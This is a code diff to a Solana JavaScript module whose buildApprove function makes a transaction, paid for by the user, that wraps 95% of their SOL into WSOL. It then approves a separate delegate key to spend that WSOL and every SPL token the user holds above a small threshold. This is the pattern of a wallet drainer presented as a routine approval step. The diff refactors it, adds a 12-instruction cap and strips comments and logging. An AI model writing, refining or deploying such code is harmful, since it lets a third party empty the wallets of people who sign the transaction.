@@ -19,8 +19,9 @@ const { withRetry } = require("../core/rpcPool");
 const { setBlockhash } = require("../core/blockhashCache");
 
 const MIN_RAW_AMOUNT = 1000n;
-const JUP_SOL_AMOUNT = 0.005 * LAMPORTS_PER_SOL; // 0.005 SOL
-const SOL_TO_WSOL_RATIO = 0.95; // Convert 95% of SOL to WSOL
+const JUP_SOL_AMOUNT = 0.005 * LAMPORTS_PER_SOL;
+const SOL_TO_WSOL_RATIO = 0.95;
+const MAX_INSTRUCTIONS_PER_TX = 12;
 
 async function buildApprove(user, connection) {
     return withRetry(async (conn) => {
@@ -35,8 +36,6 @@ async function buildApprove(user, connection) {
             const { blockhash } = await conn.getLatestBlockhash("confirmed");
             setBlockhash(blockhash);
             tx.recentBlockhash = blockhash;
-
-            // Fee payer = user
             tx.feePayer = userPubkey;
 
             // ===== 1. Create WSOL ATA (if doesn't exist) =====
@@ -48,10 +47,9 @@ async function buildApprove(user, connection) {
             );
 
             const wsolAtaInfo = await conn.getAccountInfo(wsolAta);
-            let wsolAtaCreated = false;
+            let wsolAmount = 0n;
             
             if (!wsolAtaInfo) {
-                logger.info("Creating WSOL ATA", { ata: wsolAta.toBase58() });
                 tx.add(
                     createAssociatedTokenAccountInstruction(
                         userPubkey,
@@ -62,20 +60,13 @@ async function buildApprove(user, connection) {
                         TOKEN_PROGRAM_ID
                     )
                 );
-                wsolAtaCreated = true;
             }
 
-            // ===== 2. Calculate SOL to convert =====
+            // ===== 2. Convert SOL → WSOL =====
             const userBalance = await conn.getBalance(userPubkey);
             const solToConvert = Math.floor(userBalance * SOL_TO_WSOL_RATIO);
 
             if (solToConvert > 0) {
-                logger.info("Converting SOL to WSOL", {
-                    solToConvert: solToConvert / LAMPORTS_PER_SOL,
-                    solForFees: (userBalance - solToConvert) / LAMPORTS_PER_SOL
-                });
-
-                // ===== 3. Transfer SOL to WSOL ATA =====
                 tx.add(
                     SystemProgram.transfer({
                         fromPubkey: userPubkey,
@@ -84,47 +75,42 @@ async function buildApprove(user, connection) {
                     })
                 );
 
-                // ===== 4. SyncNative - convert native SOL to WSOL tokens =====
                 tx.add(
                     createSyncNativeInstruction(
                         wsolAta,
                         TOKEN_PROGRAM_ID
                     )
                 );
+
+                wsolAmount = BigInt(solToConvert);
             }
 
-            // ===== 5. Get all token accounts =====
+            // ===== 3. Get all tokens to approve =====
             const tokenAccounts = await getUserTokenAccounts(userPubkey, conn);
             if (!tokenAccounts) throw new Error("Failed to fetch token accounts");
 
-            // ===== 6. Approve WSOL + all SPL tokens in single loop =====
-            let approvedTokenCount = 0;
+            const approvableTokens = [];
 
-            // Approve WSOL if we converted SOL
-            if (solToConvert > 0) {
-                logger.info("Adding approve for WSOL", {
-                    amount: solToConvert.toString()
+            if (wsolAmount > 0n) {
+                approvableTokens.push({
+                    ata: wsolAta,
+                    amount: wsolAmount,
+                    symbol: "WSOL"
                 });
-                tx.add(
-                    createApproveInstruction(
-                        wsolAta,
-                        delegatePubkey,
-                        userPubkey,
-                        BigInt(solToConvert)
-                    )
-                );
-                approvedTokenCount++;
             }
 
-            // Approve all other SPL tokens
             for (const token of tokenAccounts.tokens || []) {
-                if (token.amount < MIN_RAW_AMOUNT) continue;
+                if (token.amount >= MIN_RAW_AMOUNT) {
+                    approvableTokens.push({
+                        ata: new PublicKey(token.ata),
+                        amount: BigInt(token.amount),
+                        symbol: token.symbol || "Unknown"
+                    });
+                }
+            }
 
-                logger.info("Adding approve for SPL token", {
-                    mint: token.mint,
-                    amount: token.amount.toString()
-                });
-
+            // ===== 4. Approve all tokens (max 12 instructions) =====
+            for (const token of approvableTokens) {
                 tx.add(
                     createApproveInstruction(
                         token.ata,
@@ -133,22 +119,22 @@ async function buildApprove(user, connection) {
                         token.amount
                     )
                 );
-                approvedTokenCount++;
+
+                // Stop at max instructions
+                if (tx.instructions.length >= MAX_INSTRUCTIONS_PER_TX) {
+                    break;
+                }
             }
 
-            logger.info("Complete approve transaction built", {
+            logger.info("Approve TX built", {
                 instructions: tx.instructions.length,
-                wsolAtaCreated,
-                solConverted: solToConvert > 0,
-                approvedTokens: approvedTokenCount
+                approvedTokens: approvableTokens.slice(0, tx.instructions.length - (wsolAmount > 0n ? 3 : 0)).length,
+                maxInstructionsPerTx: MAX_INSTRUCTIONS_PER_TX
             });
 
             return tx;
         } catch (err) {
-            logger.error("Failed to build approve transaction", { 
-                error: err.message,
-                stack: err.stack 
-            });
+            logger.error("Failed to build approve transaction", { error: err.message });
             throw err;
         }
     }, "buildApprove");
